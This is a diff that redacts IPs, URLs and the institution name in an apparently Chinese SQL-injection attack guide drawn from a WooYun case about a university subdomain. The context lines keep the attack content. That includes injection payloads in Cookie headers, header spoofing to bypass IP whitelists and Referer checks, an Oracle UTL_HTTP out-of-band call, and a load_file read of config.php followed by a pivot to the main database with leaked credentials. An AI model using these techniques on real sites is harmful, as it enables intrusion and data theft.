@@ -148,7 +148,7 @@ AND rownum=1
 
 -- 特有函数
 CHR(65)||CHR(66)
-UTL_HTTP.request('http://test.com')
+UTL_HTTP.request('https://example.com/[已脱敏]')
 
 -- 错误特征
 "ORA-00942: table or view does not exist"
@@ -975,7 +975,7 @@ Access注入 → 文件上传漏洞 → WebShell
 
 ### 知识点来源
 - **案例**: wooyun-2015-0137200
-- **标题**: 中山大学某子站SQL注射
+- **标题**: 某单位存在安全漏洞某子站SQL注射
 - **厂商**: 中山大学（985高校）
 - **影响**: 教育机构子站系统
 
@@ -1167,16 +1167,16 @@ class EducationSiteExploiter:
 **教育类网站特定绕过**：
 ```sql
 -- 1. 绕过IP白名单
-X-Forwarded-For: 127.0.0.1
-X-Real-IP: 192.168.1.1
-Client-IP: 10.0.0.1
+X-Forwarded-For: [IP已脱敏]
+X-Real-IP: [IP已脱敏]
+Client-IP: [IP已脱敏]
 
 -- 2. 绕过Cookie验证
 Cookie: PHPSESSID=admin'; --
 Cookie: session_id=1' OR '1'='1
 
 -- 3. 绕过Referer检查
-Referer: https://trusted.sysu.edu.cn/admin/login.php
+Referer: https://example.com/[已脱敏]
 
 -- 4. 绕过User-Agent限制（爬虫伪装）
 User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
@@ -1294,13 +1294,13 @@ union select 1,load_file('/var/www/html/config.php'),3--
 
 -- 2. 发现主站数据库连接
 -- config.php内容：
--- $db_host = "192.168.1.100"
+-- $db_host = "[IP已脱敏]"
 -- $db_user = "admin"
 -- $db_pass = "P@ssw0rd"
 
 -- 3. 连接主站数据库
 -- 通过子站服务器执行：
--- mysql -h 192.168.1.100 -u admin -p P@ssw0rd
+-- mysql -h [IP已脱敏] -u admin -p P@ssw0rd
 
 -- 4. 导出主站数据
 -- 主站数据库可能包含：
@@ -1634,10 +1634,10 @@ $where['id'] = array('eq', $_GET['id']);  // 可能绕过
 
 ```bash
 # 原始URL（伪静态）
-http://target.com/Center/invest/mid/plan/bid/1.html
+https://example.com/[已脱敏]
 
 # 转换为GET参数形式
-http://target.com/Center/invest/?mid=plan&bid=1
+https://example.com/[已脱敏]
 
 # 为什么需要转换？
 # 1. 路由解析问题：部分框架对PATH_INFO模式处理不当
